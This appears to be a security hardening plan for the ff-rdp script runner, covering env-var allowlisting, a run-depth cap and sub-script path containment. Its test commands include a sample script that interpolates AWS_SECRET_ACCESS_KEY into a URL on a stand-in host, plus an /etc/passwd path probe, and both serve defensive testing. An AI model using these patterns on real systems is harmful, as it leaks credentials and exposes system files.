---
title: "Iteration 67: Script runner sandboxing — env allowlist + run depth + path containment"
type: iteration
date: 2026-05-24
status: planned
branch: iter-67/script-sandboxing
depends_on:
  - iteration-61-script-runner-recorder
  - iteration-65-safe-write-and-path-traversal-hardening
first_call_sites: []
dogfood_path: |
  # 1. Untrusted env var resolution is refused by default.
  echo '{"steps":[{"navigate":"https://x/{{env.AWS_SECRET_ACCESS_KEY}}"}]}' > /tmp/evil.json
  ff-rdp run /tmp/evil.json
  # Expected: exits non-zero, "env var AWS_SECRET_ACCESS_KEY not in allowlist (use --allow-env)"

  # 2. Explicit allowlist works.
  ff-rdp run /tmp/safe.json --allow-env LANG,USER

  # 3. Nested run depth cap.
  # Construct a 20-deep run chain; expect bail at depth 16.
  ff-rdp run /tmp/deep.json
  # Expected: exits non-zero, "run nesting depth 17 exceeds MAX_RUN_DEPTH=16"

  # 4. Absolute sub-script path refused without flag.
  echo '{"steps":[{"run":{"path":"/etc/passwd"}}]}' > /tmp/abs.json
  ff-rdp run /tmp/abs.json
  # Expected: exits non-zero, "sub-script path must be relative to top-level script dir"
tags: [iteration, security]
---

# Iteration 67: Script runner sandboxing — env allowlist + run depth + path containment

The script runner accepts untrusted input by design (recorded scripts,
shared `.script.json` files). Two gaps make that risky: `{{env.X}}`
resolves any env var without an allowlist (a hostile script exfiltrates
`AWS_SECRET_ACCESS_KEY` by interpolating it into a navigate URL), and
nested `run:` steps have cycle detection but no depth limit and no path
containment (a 1000-deep chain blows the stack; absolute paths probe
arbitrary readable files).

## Themes

- **A — Env-var allowlist.** Refuse `{{env.X}}` unless `X` is on a
  caller-supplied allowlist or in a tiny safe default set
  (`HOME`/`USER`/`LANG`). Refuse names matching `is_secret_name`
  unconditionally.
- **B — Sub-script depth + containment.** Cap nesting depth at 16; require
  sub-script paths to be descendants of the top-level script's directory
  unless `--allow-unsafe-script-paths` is set.

## Tasks

### A. Env-var allowlist
- [ ] In `crates/ff-rdp-cli/src/script/vars.rs:60-64`, gate `std::env::var(name)` on an `EnvPolicy { allowlist: HashSet<String>, defaults: &[...] }`.
- [ ] Define `SAFE_DEFAULTS: &[&str] = &["HOME", "USER", "LANG", "LC_ALL", "TZ"]`.
- [ ] Unconditionally refuse any name matched by `is_secret_name` (already defined nearby), even if explicitly allowlisted — fail closed.
- [ ] Add `--allow-env <comma-list>` CLI flag on `ff-rdp run`; thread through.
- [ ] Update the substitution error to name the variable and suggest the flag.

### B. Sub-script depth + containment
- [ ] Add `const MAX_RUN_DEPTH: usize = 16;` at the top of `crates/ff-rdp-cli/src/script/runner.rs`.
- [ ] In `run_script_file`, bail with a typed error if `call_stack.len() >= MAX_RUN_DEPTH` (line 1101 area).
- [ ] At the path-resolution site (1101-1135), reject absolute paths and `..`-traversing relative paths unless `--allow-unsafe-script-paths` is set. Containment ancestor = top-level script's parent dir.
- [ ] Plumb the flag through `Cli` into the runner context.

## Acceptance Criteria [0/6]

- [ ] `env_substitution_rejects_unallowed`: `{{env.AWS_SECRET_ACCESS_KEY}}` returns `Err(EnvNotAllowed("AWS_SECRET_ACCESS_KEY"))` with no allowlist.
- [ ] `env_substitution_allowlist_works`: with `--allow-env FOO`, `{{env.FOO}}` resolves; `{{env.BAR}}` still fails.
- [ ] `env_substitution_refuses_secret_names`: `{{env.AWS_SECRET_ACCESS_KEY}}` fails even when allowlisted (secret-name policy is unconditional).
- [ ] `run_depth_capped`: a 20-deep run chain bails at depth 16 with `RunDepthExceeded`.
- [ ] `run_path_containment`: `run: { path: "/etc/passwd" }` refuses without flag; resolves with `--allow-unsafe-script-paths`.
- [ ] `cargo fmt && cargo clippy --workspace --all-targets -- -D warnings && cargo test --workspace -q` clean.

## Design notes

Fail-closed on secret-name patterns is intentional: the typical incident
shape is a teammate sharing a "harmless looking" script that happens to
read a credential via interpolation. Even an explicit allowlist shouldn't
override the secret-name shape, because the operator approving the
allowlist may not have noticed the secret in their env.

`MAX_RUN_DEPTH = 16` matches the kind of depth a legitimate script ever
needs (top-level → suite → subtest → fixture-setup → action). Configurable
via env var if a real use case appears.

`--allow-unsafe-script-paths` exists for the dogfooding case (running a
script that includes a shared lib under `~/scripts/lib/`). Documented as
"only enable when you author every file in the include chain".

## Out of scope

- A signed-script format (would solve the trust problem more cleanly but
  needs separate design work; file a research note).
- Per-step capability gating (e.g. "this script may not call eval"). Bigger
  redesign of the runner; out of scope here.

## References

- [[iteration-61-script-runner-recorder]]
- Security review report (2026-05-24), findings F-7, F-8
